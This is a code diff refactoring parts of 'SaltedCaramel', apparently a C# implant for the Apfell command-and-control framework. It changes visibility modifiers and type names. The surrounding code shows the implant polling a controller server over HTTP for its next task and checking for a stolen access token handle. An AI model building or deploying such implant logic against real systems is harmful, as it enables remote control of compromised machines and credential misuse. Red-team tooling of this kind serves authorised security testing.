@@ -12,7 +12,7 @@ namespace SaltedCaramel
     /// Struct for formatting task output or other information to send back
     /// to Apfell server
     /// </summary>
-    internal struct SCTaskResp
+    public struct SCTaskResp
     {
         public string response;
         public string id;
@@ -46,7 +46,7 @@ namespace SaltedCaramel
     /// <summary>
     /// This class contains all methods used by the CaramelImplant
     /// </summary>
-    internal class SCImplant
+    public class SCImplant
     {
         internal string callbackId { get; set; }
         internal string endpoint { get; set; }
@@ -165,7 +165,7 @@ namespace SaltedCaramel
         /// Check Apfell endpoint for new task
         /// </summary>
         /// <returns>CaramelTask with the next task to execute</returns>
-        public SCTask CheckTasking()
+        public SCTaskObject CheckTasking()
         {
             string taskEndpoint = this.endpoint + "tasks/callback/" + this.callbackId + "/nextTask";
             try // Try block for checking tasks (throws if retries exceeded)
@@ -174,7 +174,7 @@ namespace SaltedCaramel
                 {
                     try // Try block for HTTP request
                     {
-                        SCTask task = JsonConvert.DeserializeObject<SCTask>(HTTP.Get(taskEndpoint));
+                        SCTaskObject task = JsonConvert.DeserializeObject<SCTaskObject>(HTTP.Get(taskEndpoint));
                         retry = 0;
                         if (task.command != "none")
                             Debug.WriteLine("[-] CheckTasking - NEW TASK with ID: " + task.id);
@@ -197,9 +197,9 @@ namespace SaltedCaramel
             }
         }
 
-        internal bool hasAlternateToken()
+        public bool hasAlternateToken()
         {
-            if (Token.stolenHandle != IntPtr.Zero)
+            if (Tasks.Token.stolenHandle != IntPtr.Zero)
                 return true;
             else return false;
         }
